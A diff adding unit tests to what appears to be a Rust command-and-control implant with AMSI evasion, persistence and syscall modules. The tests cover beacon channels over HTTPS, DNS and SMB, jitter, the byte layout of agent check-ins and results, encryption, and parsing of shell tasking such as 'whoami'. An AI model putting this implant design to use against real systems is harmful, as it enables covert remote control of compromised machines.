@@ -6,6 +6,8 @@
 use crate::evasion::amsi::AmsiTarget;
 use crate::cli::CLI;
 use crate::payload::encrypt::EncryptMethod;
+use crate::comms::{self, Channel};
+use crate::comms::protocol::{self, TaskType};
 use crate::persistence::PersistMethod;
 use crate::syscall::indirect::ResolutionMethod;
 use crate::evasion::sleep_obfs::SleepMethod;
@@ -63,6 +65,14 @@ fn test_cli_struct() {
         persist_method: String::new(),
         persist_name: String::new(),
         persist_target: String::new(),
+        comms_channel: "https".to_string(),
+        comms_host: String::new(),
+        comms_port: 443,
+        comms_interval: 60000,
+        comms_jitter: 15,
+        comms_key: String::new(),
+        comms_path: "/api/status".to_string(),
+        comms_use_sleep_obfs: false,
     };
     assert_eq!(cli.command, "analyze");
     assert!(cli.dry_run);
@@ -947,4 +957,152 @@ fn test_persist_print_info() {
     crate::persistence::print_info(&log);
     let entries = log.drain();
     assert!(entries.len() >= 6);
+}
+
+// ── Communications ──────────────────────────────────────────────────────────
+
+#[test]
+fn test_channel_from_str() {
+    assert_eq!(Channel::from_str("https"), Some(Channel::Https));
+    assert_eq!(Channel::from_str("http"), Some(Channel::Https));
+    assert_eq!(Channel::from_str("web"), Some(Channel::Https));
+    assert_eq!(Channel::from_str("wininet"), Some(Channel::Https));
+    assert_eq!(Channel::from_str("dns"), Some(Channel::Dns));
+    assert_eq!(Channel::from_str("nameresolution"), Some(Channel::Dns));
+    assert_eq!(Channel::from_str("smb"), Some(Channel::Smb));
+    assert_eq!(Channel::from_str("pipe"), Some(Channel::Smb));
+    assert_eq!(Channel::from_str("namedpipe"), Some(Channel::Smb));
+    assert_eq!(Channel::from_str("unknown"), None);
+    assert_eq!(Channel::from_str(""), None);
+}
+
+#[test]
+fn test_channel_name() {
+    assert_eq!(Channel::Https.name(), "Secure Web Channel");
+    assert_eq!(Channel::Dns.name(), "Name Resolution Channel");
+    assert_eq!(Channel::Smb.name(), "Network Share Channel");
+}
+
+#[test]
+fn test_channel_all() {
+    let all = Channel::all();
+    assert_eq!(all.len(), 3);
+    assert_eq!(all[0], Channel::Https);
+    assert_eq!(all[1], Channel::Dns);
+    assert_eq!(all[2], Channel::Smb);
+}
+
+#[test]
+fn test_comms_dry_run() {
+    let log = LogSink::new();
+    comms::dry_run("https", "10.0.0.1", 443, 60000, &log);
+    let entries = log.drain();
+    assert!(entries.iter().any(|e| e.message.contains("Secure Web Channel")));
+}
+
+#[test]
+fn test_comms_print_info() {
+    let log = LogSink::new();
+    comms::print_info(&log);
+    let entries = log.drain();
+    assert!(entries.len() >= 3);
+}
+
+#[test]
+fn test_protocol_serialize_checkin() {
+    let agent_id = [0xAA; 16];
+    let buf = protocol::serialize_checkin(&agent_id, "WORKSTATION", 30000);
+    assert_eq!(buf[0], 0x01);
+    assert_eq!(&buf[1..17], &[0xAA; 16]);
+    let host_len = u32::from_le_bytes([buf[17], buf[18], buf[19], buf[20]]);
+    assert_eq!(host_len, 11);
+    assert_eq!(&buf[21..32], b"WORKSTATION");
+    let sleep_ms = u32::from_le_bytes([buf[32], buf[33], buf[34], buf[35]]);
+    assert_eq!(sleep_ms, 30000);
+}
+
+#[test]
+fn test_protocol_serialize_result() {
+    let agent_id = [0xBB; 16];
+    let output = b"output data";
+    let buf = protocol::serialize_result(&agent_id, 42, true, output);
+    assert_eq!(buf[0], 0x03);
+    assert_eq!(&buf[1..17], &[0xBB; 16]);
+    let task_id = u32::from_le_bytes([buf[17], buf[18], buf[19], buf[20]]);
+    assert_eq!(task_id, 42);
+    assert_eq!(buf[21], 0x00); // success
+    let out_len = u32::from_le_bytes([buf[22], buf[23], buf[24], buf[25]]);
+    assert_eq!(out_len, 11);
+    assert_eq!(&buf[26..37], b"output data");
+}
+
+#[test]
+fn test_protocol_encrypt_decrypt_roundtrip() {
+    let data = b"hello from protocol test";
+    let key = b"testkey123";
+    let encrypted = protocol::encrypt_message(data, key);
+    assert_ne!(&encrypted[..], &data[..]);
+    let decrypted = protocol::decrypt_message(&encrypted, key);
+    assert_eq!(&decrypted[..], &data[..]);
+}
+
+#[test]
+fn test_protocol_parse_task_list_empty() {
+    let mut buf = vec![0x02]; // MSG_TASK_LIST
+    buf.extend_from_slice(&0u32.to_le_bytes()); // 0 tasks
+    let tasks = protocol::parse_task_list(&buf).unwrap();
+    assert!(tasks.is_empty());
+}
+
+#[test]
+fn test_protocol_parse_task_list_shell() {
+    let cmd = b"whoami";
+    let mut buf = vec![0x02]; // MSG_TASK_LIST
+    buf.extend_from_slice(&1u32.to_le_bytes()); // 1 task
+    buf.extend_from_slice(&7u32.to_le_bytes()); // task_id=7
+    buf.push(0x01); // Shell
+    buf.extend_from_slice(&(cmd.len() as u32).to_le_bytes());
+    buf.extend_from_slice(cmd);
+    let tasks = protocol::parse_task_list(&buf).unwrap();
+    assert_eq!(tasks.len(), 1);
+    assert_eq!(tasks[0].id, 7);
+    assert_eq!(tasks[0].task_type, TaskType::Shell);
+    assert_eq!(&tasks[0].data, cmd);
+}
+
+#[test]
+fn test_protocol_parse_task_list_invalid_type() {
+    let mut buf = vec![0xFF]; // wrong msg type
+    buf.extend_from_slice(&0u32.to_le_bytes());
+    assert!(protocol::parse_task_list(&buf).is_err());
+}
+
+#[test]
+fn test_parse_hex_key_valid() {
+    let key = comms::parse_hex_key("aabbccdd").unwrap();
+    assert_eq!(key, vec![0xAA, 0xBB, 0xCC, 0xDD]);
+}
+
+#[test]
+fn test_parse_hex_key_invalid() {
+    assert!(comms::parse_hex_key("").is_err());
+    assert!(comms::parse_hex_key("abc").is_err()); // odd length
+    assert!(comms::parse_hex_key("zzzz").is_err()); // non-hex
+}
+
+#[test]
+fn test_generate_agent_id() {
+    let id = comms::generate_agent_id();
+    assert_eq!(id.len(), 16);
+    let all_zero = id.iter().all(|&b| b == 0);
+    assert!(!all_zero);
+}
+
+#[test]
+fn test_task_type_from_u8() {
+    assert_eq!(TaskType::from_u8(0), Some(TaskType::Nop));
+    assert_eq!(TaskType::from_u8(1), Some(TaskType::Shell));
+    assert_eq!(TaskType::from_u8(2), Some(TaskType::SleepChange));
+    assert_eq!(TaskType::from_u8(3), Some(TaskType::Exit));
+    assert_eq!(TaskType::from_u8(255), None);
 }
